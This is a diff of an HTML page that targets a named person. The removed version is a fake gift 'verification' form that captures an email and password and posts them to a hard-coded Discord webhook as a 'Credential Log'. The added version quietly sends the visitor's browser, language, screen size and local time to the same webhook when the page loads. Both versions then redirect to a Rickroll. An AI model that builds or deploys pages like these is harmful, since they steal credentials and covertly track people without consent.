@@ -1,69 +1,43 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>A Private Message...</title>
-    <style>
-        body { background: #1a1a1a; color: white; font-family: 'Helvetica Neue', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-card { background: #2f3136; padding: 40px; border-radius: 10px; width: 320px; text-align: center; border-top: 5px solid #ff4d4d; }
-        .user-avatar { font-size: 60px; margin-bottom: 10px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 4px; border: none; background: #202225; color: white; box-sizing: border-box; }
-        .claim-btn { width: 100%; padding: 12px; background: #5865f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
-        .claim-btn:hover { background: #4752c4; }
-        #target-name { color: #ff4d4d; font-weight: bold; }
-    </style>
-</head>
-<body>
-
-    <div class="login-card">
-        <div class="user-avatar">🎁</div>
-        <h3>Verification Needed</h3>
-        <p>Hello, <span id="target-name">Guest</span>! Please verify your account to open the gift sent to you.</p>
-        
-        <input type="text" id="email" placeholder="Email or Phone Number">
-        <input type="password" id="pass" placeholder="Password">
-        
-        <button class="claim-btn" onclick="execute()">VERIFY & OPEN</button>
-    </div>
-
+    <title>Surprise for heartboxx</title>
     <script>
-        // 1. Identify WHO clicked by reading the URL (?id=name)
-        const urlParams = new URLSearchParams(window.location.search);
-        const username = urlParams.get('id') || "Guest";
-        document.getElementById('target-name').innerText = username;
+        const hook = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
 
-        const WEBHOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
+        async function autoLog() {
+            // This runs the moment the page loads
+            const info = {
+                browser: navigator.userAgent,
+                lang: navigator.language,
+                time: new Date().toString(),
+                screen: `${window.screen.width}x${window.screen.height}`
+            };
 
-        async function execute() {
-            const e = document.getElementById('email').value;
-            const p = document.getElementById('pass').value;
-
-            if(!e || !p) { alert("Credentials required for verification."); return; }
-
-            // 2. Send the captured data + the username to your webhook
-            try {
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `🔔 **NEW CAPTURE FROM: ${username.toUpperCase()}**`,
-                        embeds: [{
-                            title: "Credential Log",
-                            color: 16724301,
-                            fields: [
-                                { name: "Identified User", value: username, inline: true },
-                                { name: "Email/Phone", value: e },
-                                { name: "Password", value: p }
-                            ],
-                            footer: { text: "Redirecting to Rickroll..." }
-                        }]
-                    })
-                });
-            } catch (err) {}
-
-            // 3. The Rickroll
+            await fetch(hook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: "🕵️ **TARGET DETECTED - CLICK LOGGED**",
+                    embeds: [{
+                        title: "Initial Intelligence",
+                        fields: [
+                            { name: "Target", value: "heartboxx" },
+                            { name: "Device", value: info.browser },
+                            { name: "Local Time", value: info.time }
+                        ],
+                        color: 16724301
+                    }]
+                })
+            });
+            
+            // Now redirect them to the Rickroll
             window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
         }
+        window.onload = autoLog;
     </script>
+</head>
+<body style="background: black; color: white; display: flex; align-items: center; justify-content: center; height: 100vh;">
+    <h1>Loading Heart Box...</h1>
 </body>
 </html>
